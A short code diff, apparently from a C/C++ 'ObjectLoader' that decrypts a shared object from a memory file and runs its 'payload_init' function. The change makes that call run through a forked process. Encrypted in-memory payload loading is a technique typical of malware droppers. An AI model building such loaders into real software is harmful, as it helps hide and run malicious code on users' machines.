@@ -1,6 +1,7 @@
 
 #include "stdafx.h"
 #include "Crypto.h"
+#include "Executor.h"
 
 #ifndef OBJECT_LOADER_H
 #define OBJECT_LOADER_H
@@ -91,8 +92,8 @@ public:
 
         // Execute
         payload func = (payload)dlsym(this->objectHandle, "payload_init"); // "payload_init"
-        int returnCode = func();
-
+        int returnCode = executeFork(func);
+        
         // Clean cleanup
         dlclose(this->objectHandle);
         fclose(this->encryptedMemoryFile);
